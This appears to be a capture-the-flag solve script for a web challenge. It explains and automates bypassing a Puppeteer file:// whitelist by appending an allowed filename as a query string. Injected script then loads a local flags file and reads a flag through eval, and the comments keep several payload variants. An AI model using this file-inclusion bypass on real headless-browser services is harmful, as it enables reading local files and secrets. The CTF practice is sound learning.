#!/usr/bin/env python3
import requests
from _env import HOST

print(
    """
[WEB] Hard++

NOT_IMPLEMENTED 

There exists a way to extract all 11 (12) flags through a file inclusion from Puppeteer/Chrome.
This exploits the way puppeteer paths are sanitized in weeterpreter:

```
        page.on('request', r=> (r.url().startsWith("file://") && (
                r.url().endsWith("weelang/pypyjs.html") ||
                r.url().endsWith("lib/FunctionPromise.js") ||
                r.url().endsWith("lib/pypyjs.js") ||
                r.url().endsWith("lib/pypyjs.vm.js") ||
                r.url().endsWith("lib/pypyjs.vm.js.zmem")
            ) ? r.continue() : r.abort() && console.log("blocked", r.url()))
```
Since we run in a file:// context, we can include other files using relative paths, disabling CORS completely.
By adding one of the whitelisted filenames, we can then request any local files, including flags.py!
We can craft a <script src="../pyserver/flags.py?lib/pypyjs.js/> which will automatically export all interesting flags as part of the global js Namespace.
With a second eval (the chrome sessions are not reset), we can then extract the NOT_IMPLEMENTED flag!

Running code is simply a POST request to /wee/run with the code as "code" in json.

We run:
    alert(assert_equals(1/0*0))

The Flag is: 
    """
)


def run_wee(code):
    r = requests.post("http://{}/wee/run".format(HOST), json={"code": code})
    return r.json()["result"]


if __name__ == "__main__":
    code = '''
    eval("s = document.createElement(`script`),s.type = `text/javascript`,s.src = `../pyserver/flags.py?lib/pypyjs.js`,document.head.append(s)") 
    pause(3) 
    alert(eval("NOT_IMPLEMENTED"))
    '''
    print(run_wee(code))
#
# var s = document.createElement("script")
# s.type = "text/javascript"
# s.src = "../pyserver/flags.py"
# document.head.append(s)
# NOT_IMPLEMENTED
#
# req 1:
# s = document.createElement("script"),s.type = "text/javascript",s.src = "../pyserver/flags.py",document.head.append(s)
#
# req 2:
# NOT_IMPLEMENTED
#
#
# eval('s = document.createElement("script"),s.type = "text/javascript",s.src = "../pyserver/flags.py?lib/pypyjs.js",document.head.append(s)')
# pause(1)
# alert(eval('NOT_IMPLEMENTED'))
#
# "eval('s = document.createElement(\"script\"),s.type = \"text/javascript\",s.src = \"../pyserver/flags.py\",document.head.append(s)') pause(1) print(eval('NOT_IMPLEMENTED'))"

